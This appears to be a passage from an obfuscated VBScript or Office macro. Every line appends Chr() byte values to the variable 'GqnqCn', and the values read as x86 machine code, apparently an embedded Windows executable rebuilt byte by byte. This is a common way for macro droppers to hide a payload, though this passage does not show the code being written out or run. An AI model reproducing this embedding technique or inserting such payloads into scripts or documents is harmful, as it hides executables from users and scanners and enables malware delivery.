GqnqCn=GqnqCn&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(89)&Chr(232)&Chr(12)&Chr(26)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(129)&Chr(64)&Chr(0)&Chr(104)&Chr(240)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(161)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(66)&Chr(104)&Chr(196)&Chr(31)&Chr(64)&Chr(0)&Chr(232)&Chr(214)&Chr(25)&Chr(0)&Chr(0)&Chr(184)&Chr(232)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(4)&Chr(36)&Chr(236)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(99)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(61)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(89)&Chr(116)&Chr(27)&Chr(104)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(125)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(106)&Chr(0)&Chr(106)&Chr(2)
GqnqCn=GqnqCn&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(106)&Chr(24)&Chr(104)&Chr(248)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(52)&Chr(18)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(125)&Chr(22)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(51)&Chr(219)&Chr(67)&Chr(57)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(197)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(29)&Chr(152)&Chr(172)&Chr(64)&Chr(0)&Chr(138)&Chr(69)&Chr(16)&Chr(162)&Chr(148)&Chr(172)&Chr(64)&Chr(0)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(15)&Chr(133)&Chr(157)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(163)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(116)&Chr(120)&Chr(255)&Chr(53)&Chr(228)&Chr(183)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(232)&Chr(142)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(117)&Chr(224)&Chr(131)&Chr(238)&Chr(4)&Chr(137)&Chr(117)&Chr(220)&Chr(59)&Chr(247)&Chr(114)&Chr(87)&Chr(232)&Chr(106)&Chr(12)&Chr(0)&Chr(0)&Chr(57)&Chr(6)&Chr(116)&Chr(237)&Chr(59)&Chr(247)&Chr(114)&Chr(74)&Chr(255)&Chr(54)&Chr(232)&Chr(100)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(84)&Chr(12)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(255)&Chr(215)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(78)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(12)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(5)&Chr(57)&Chr(69)&Chr(224)&Chr(116)&Chr(14)&Chr(137)&Chr(125)&Chr(228)
GqnqCn=GqnqCn&Chr(137)&Chr(125)&Chr(216)&Chr(137)&Chr(69)&Chr(224)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(139)&Chr(125)&Chr(216)&Chr(235)&Chr(159)&Chr(104)&Chr(12)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(8)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(95)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(20)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(16)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(79)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(40)&Chr(137)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(171)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(51)&Chr(219)&Chr(67)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(8)&Chr(232)
GqnqCn=GqnqCn&Chr(146)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(232)&Chr(90)&Chr(17)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(195)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(173)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(232)&Chr(157)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(142)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(102)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(62)&Chr(28)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(49)&Chr(21)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(174)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(153)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(129)&Chr(25)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(254)&Chr(1)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(83)&Chr(19)&Chr(0)&Chr(0)&Chr(104)&Chr(186)&Chr(20)&Chr(64)&Chr(0)&Chr(232)&Chr(184)&Chr(10)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(163)&Chr(4)&Chr(160)&Chr(64)&Chr(0)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(83)&Chr(139)&Chr(93)&Chr(8)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(59)&Chr(28)&Chr(253)&Chr(8)&Chr(160)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(71)&Chr(137)&Chr(125)&Chr(252)&Chr(131)&Chr(255)&Chr(23)
GqnqCn=GqnqCn&Chr(114)&Chr(238)&Chr(131)&Chr(255)&Chr(23)&Chr(15)&Chr(131)&Chr(119)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(145)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(52)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(128)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(13)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(132)&Chr(27)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(251)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(65)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(232)&Chr(134)&Chr(64)&Chr(158)&Chr(187)&Chr(20)&Chr(3)&Chr(0)&Chr(0)&Chr(83)&Chr(191)&Chr(160)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(228)&Chr(30)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)
GqnqCn=GqnqCn&Chr(130)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(185)&Chr(172)&Chr(64)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(198)&Chr(5)&Chr(189)&Chr(173)&Chr(64)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(38)&Chr(104)&Chr(208)&Chr(134)&Chr(64)&Chr(0)&Chr(104)&Chr(251)&Chr(2)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(162)&Chr(30)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(62)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(86)&Chr(232)&Chr(251)&Chr(29)&Chr(0)&Chr(0)&Chr(64)&Chr(89)&Chr(131)&Chr(248)&Chr(60)&Chr(118)&Chr(56)&Chr(86)&Chr(232)&Chr(238)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(238)&Chr(59)&Chr(3)&Chr(198)&Chr(106)
GqnqCn=GqnqCn&Chr(3)&Chr(185)&Chr(180)&Chr(175)&Chr(64)&Chr(0)&Chr(104)&Chr(204)&Chr(134)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(81)&Chr(80)&Chr(232)&Chr(20)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(51)&Chr(246)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(251)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(104)&Chr(200)&Chr(134)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(122)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(215)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(69)&Chr(252)&Chr(255)&Chr(52)&Chr(197)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(85)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)
GqnqCn=GqnqCn&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(178)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(16)&Chr(32)&Chr(1)&Chr(0)&Chr(104)&Chr(160)&Chr(134)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(200)&Chr(26)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(50)&Chr(106)&Chr(244)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(222)&Chr(116)&Chr(36)&Chr(131)&Chr(251)&Chr(255)&Chr(116)&Chr(31)&Chr(106)&Chr(0)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(52)&Chr(253)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(57)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(80)&Chr(255)&Chr(54)&Chr(83)&Chr(255)&Chr(21)&Chr(28)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(3)&Chr(232)&Chr(21)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(131)
GqnqCn=GqnqCn&Chr(248)&Chr(1)&Chr(116)&Chr(21)&Chr(106)&Chr(3)&Chr(232)&Chr(8)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(31)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(22)&Chr(104)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(41)&Chr(254)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(31)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(195)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(86)&Chr(232)&Chr(10)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(86)&Chr(92)&Chr(161)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(202)&Chr(83)&Chr(57)&Chr(57)&Chr(116)&Chr(14)&Chr(139)&Chr(216)&Chr(107)&Chr(219)&Chr(12)&Chr(131)&Chr(193)&Chr(12)&Chr(3)
GqnqCn=GqnqCn&Chr(218)&Chr(59)&Chr(203)&Chr(114)&Chr(238)&Chr(107)&Chr(192)&Chr(12)&Chr(3)&Chr(194)&Chr(59)&Chr(200)&Chr(115)&Chr(8)&Chr(57)&Chr(57)&Chr(117)&Chr(4)&Chr(139)&Chr(193)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(139)&Chr(88)&Chr(8)&Chr(137)&Chr(93)&Chr(252)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(5)&Chr(117)&Chr(12)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(51)&Chr(192)&Chr(64)&Chr(233)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(1)&Chr(15)&Chr(132)&Chr(222)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(96)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(77)&Chr(12)&Chr(137)&Chr(78)&Chr(96)&Chr(139)&Chr(72)&Chr(4)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(133)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(139)&Chr(61)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(209)&Chr(3)&Chr(249)&Chr(59)&Chr(215)&Chr(125)&Chr(36)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(126)&Chr(92)&Chr(131)&Chr(100)&Chr(57)&Chr(8)&Chr(0)&Chr(139)&Chr(61)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(29)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(66)&Chr(3)&Chr(223)&Chr(131)&Chr(193)&Chr(12)&Chr(59)&Chr(211)&Chr(124)&Chr(226)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(0)&Chr(139)&Chr(126)&Chr(100)&Chr(61)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(94)&Chr(61)&Chr(144)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(78)&Chr(61)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(132)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(235)&Chr(62)&Chr(61)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(133)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(46)&Chr(61)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(30)&Chr(61)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(134)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(14)&Chr(61)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(7)&Chr(199)&Chr(70)&Chr(100)&Chr(138)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(100)&Chr(106)&Chr(8)&Chr(255)&Chr(211)&Chr(89)&Chr(137)&Chr(126)&Chr(100)&Chr(235)&Chr(7)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(81)&Chr(255)&Chr(211)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(137)&Chr(70)&Chr(96)&Chr(131)&Chr(200)&Chr(255)&Chr(91)&Chr(95)&Chr(94)&Chr(201)
GqnqCn=GqnqCn&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(57)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(113)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(190)&Chr(128)&Chr(135)&Chr(64)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(119)&Chr(8)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(133)&Chr(255)&Chr(116)&Chr(36)&Chr(60)&Chr(34)&Chr(117)&Chr(9)&Chr(51)&Chr(201)&Chr(133)&Chr(255)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(249)&Chr(15)&Chr(182)&Chr(192)&Chr(80)&Chr(232)&Chr(97)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(1)&Chr(70)&Chr(70)&Chr(235)&Chr(211)&Chr(60)&Chr(32)&Chr(119)&Chr(7)&Chr(70)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(245)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(23)&Chr(36)&Chr(0)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(133)&Chr(246)&Chr(117)&Chr(24)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(61)&Chr(116)&Chr(1)&Chr(71)&Chr(86)&Chr(232)&Chr(1)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(141)&Chr(116)&Chr(6)&Chr(1)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(234)&Chr(106)&Chr(4)&Chr(71)&Chr(87)&Chr(232)&Chr(211)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(137)&Chr(61)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(133)&Chr(255)&Chr(116)&Chr(203)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(83)&Chr(235)&Chr(66)&Chr(86)&Chr(232)&Chr(208)&Chr(26)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(67)&Chr(128)&Chr(62)&Chr(61)&Chr(89)&Chr(116)
GqnqCn=GqnqCn&Chr(49)&Chr(106)&Chr(1)&Chr(83)&Chr(232)&Chr(165)&Chr(36)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(137)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(78)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(58)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(214)&Chr(16)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(199)&Chr(4)&Chr(3)&Chr(243)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(185)&Chr(255)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(232)&Chr(151)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(39)&Chr(0)&Chr(199)&Chr(5)&Chr(224)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(89)&Chr(91)&Chr(95)&Chr(94)&Chr(195)&Chr(255)&Chr(53)&Chr(124)&Chr(172)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(232)&Chr(113)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(228)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(139)&Chr(77)&Chr(16)&Chr(83)&Chr(51)&Chr(192)&Chr(86)&Chr(137)&Chr(7)&Chr(139)&Chr(242)&Chr(139)&Chr(85)&Chr(12)&Chr(199)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(8)&Chr(116)&Chr(9)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(19)&Chr(137)&Chr(69)&Chr(252)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(16)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(252)&Chr(179)&Chr(34)&Chr(15)&Chr(148)&Chr(192)&Chr(70)&Chr(137)&Chr(69)&Chr(252)&Chr(235)&Chr(60)&Chr(255)&Chr(7)&Chr(133)&Chr(210)&Chr(116)&Chr(8)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(137)&Chr(85)&Chr(12)&Chr(138)&Chr(30)&Chr(15)&Chr(182)
GqnqCn=GqnqCn&Chr(195)&Chr(80)&Chr(70)&Chr(232)&Chr(16)&Chr(28)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(19)&Chr(255)&Chr(7)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(132)&Chr(219)&Chr(116)&Chr(50)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(169)&Chr(128)&Chr(251)&Chr(32)&Chr(116)&Chr(5)&Chr(128)&Chr(251)&Chr(9)&Chr(117)&Chr(159)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(66)&Chr(255)&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)&Chr(233)&Chr(0)&Chr(0)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(116)&Chr(4)&Chr(60)&Chr(9)&Chr(117)&Chr(6)&Chr(70)&Chr(235)&Chr(243)&Chr(78)&Chr(235)&Chr(227)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)
GqnqCn=GqnqCn&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(8)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(16)&Chr(255)&Chr(1)&Chr(51)&Chr(219)&Chr(67)&Chr(51)&Chr(201)&Chr(235)&Chr(2)&Chr(70)&Chr(65)&Chr(128)&Chr(62)&Chr(92)&Chr(116)&Chr(249)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(38)&Chr(246)&Chr(193)&Chr(1)&Chr(117)&Chr(31)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(128)&Chr(56)&Chr(34)&Chr(117)&Chr(4)&Chr(139)&Chr(240)&Chr(235)&Chr(13)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(57)&Chr(69)&Chr(252)&Chr(15)&Chr(148)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(209)&Chr(233)&Chr(133)&Chr(201)&Chr(116)&Chr(18)&Chr(73)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(2)&Chr(92)&Chr(66)&Chr(255)&Chr(7)&Chr(133)&Chr(201)&Chr(117)&Chr(241)&Chr(137)&Chr(85)&Chr(12)
GqnqCn=GqnqCn&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(116)&Chr(85)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(8)&Chr(60)&Chr(32)&Chr(116)&Chr(75)&Chr(60)&Chr(9)&Chr(116)&Chr(71)&Chr(133)&Chr(219)&Chr(116)&Chr(61)&Chr(15)&Chr(190)&Chr(192)&Chr(80)&Chr(133)&Chr(210)&Chr(116)&Chr(35)&Chr(232)&Chr(43)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(138)&Chr(6)&Chr(139)&Chr(77)&Chr(12)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(235)&Chr(13)&Chr(232)&Chr(8)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(70)&Chr(255)&Chr(7)&Chr(255)&Chr(7)&Chr(139)&Chr(85)&Chr(12)&Chr(70)&Chr(233)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(210)&Chr(116)&Chr(7)&Chr(198)&Chr(2)&Chr(0)&Chr(66)&Chr(137)
